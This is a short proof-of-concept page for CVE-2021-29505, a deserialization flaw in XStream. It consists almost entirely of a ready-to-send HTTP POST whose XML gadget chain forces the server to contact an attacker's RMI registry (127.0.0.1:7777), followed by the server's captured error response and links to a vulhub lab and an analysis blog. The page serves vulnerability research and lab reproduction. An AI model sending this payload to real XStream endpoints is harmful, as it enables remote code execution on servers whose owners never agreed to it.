## CVE-2021-29505

### poc
```http
POST /xstream/deserialize HTTP/1.1
Host: cqq.com:8888
Connection: close
Cookie: JSESSIONID=CBDECCC9308191A35EE694BE7373EDB1
Content-Type: application/xml
Content-Length: 3107

<java.util.PriorityQueue serialization='custom'>
    <unserializable-parents/>
    <java.util.PriorityQueue>
        <default>
            <size>2</size>
        </default>
        <int>3</int>
        <javax.naming.ldap.Rdn_-RdnEntry>
            <type>12345</type>
            <value class='com.sun.org.apache.xpath.internal.objects.XString'>
                <m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content</m__obj>
            </value>
        </javax.naming.ldap.Rdn_-RdnEntry>
        <javax.naming.ldap.Rdn_-RdnEntry>
            <type>12345</type>
            <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>
                <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>
                    <parsedMessage>true</parsedMessage>
                    <soapVersion>SOAP_11</soapVersion>
                    <bodyParts/>
                    <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>
                        <attachmentsInitialized>false</attachmentsInitialized>
                        <nullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>
                            <aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'>
                                <candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'>
                                    <names>
                                        <string>aa</string>
                                        <string>aa</string>
                                    </names>
                                    <ctx>
                                        <environment/>
                                        <registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'>
                                            <java.rmi.server.RemoteObject>
                                                <string>UnicastRef</string>
                                                <string>127.0.0.1</string>
                                                <int>7777</int>
                                                <long>0</long>
                                                <int>0</int>
                                                <long>0</long>
                                                <short>0</short>
                                                <boolean>false</boolean>
                                            </java.rmi.server.RemoteObject>
                                        </registry>
                                        <host>127.0.0.1</host>
                                        <port>7777</port>
                                    </ctx>
                                </candidates>
                            </aliases>
                        </nullIter>
                    </sm>
                </message>
            </value>
        </javax.naming.ldap.Rdn_-RdnEntry>
    </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

响应：
```
HTTP/1.1 500 
Content-Type: application/json;charset=UTF-8
Date: Tue, 25 May 2021 02:20:40 GMT
Connection: close
Content-Length: 828

{"timestamp":1621909240933,"status":500,"error":"Internal Server Error","exception":"com.thoughtworks.xstream.converters.ConversionException","message":"Failed calling method\n---- Debugging information ----\nmessage             : Failed calling method\ncause-exception     : com.thoughtworks.xstream.converters.ConversionException\ncause-message       : \nmethod              : java.util.PriorityQueue.readObject()\nclass               : java.util.PriorityQueue\nrequired-type       : java.util.PriorityQueue\nconverter-type      : com.thoughtworks.xstream.converters.reflection.SerializableConverter\npath                : /java.util.PriorityQueue/java.util.PriorityQueue/javax.naming.ldap.Rdn$RdnEntry[2]/value/message/sm/nullIter\nversion             : 1.4.13\n-------------------------------","path":"/xstream/deserialize"}
```


### Ref

- [XStream 反序列化命令执行漏洞（CVE-2021-29505）](https://github.com/vulhub/vulhub/blob/fcc5f821cb282b9053dbae3322512e341f365f3d/xstream/CVE-2021-29505/README.zh-cn.md)
- [Java安全之XStream 漏洞分析](https://www.cnblogs.com/nice0e3/p/15046895.html#0x02-xstream-%E4%BD%BF%E7%94%A8%E4%B8%8E%E8%A7%A3%E6%9E%90)
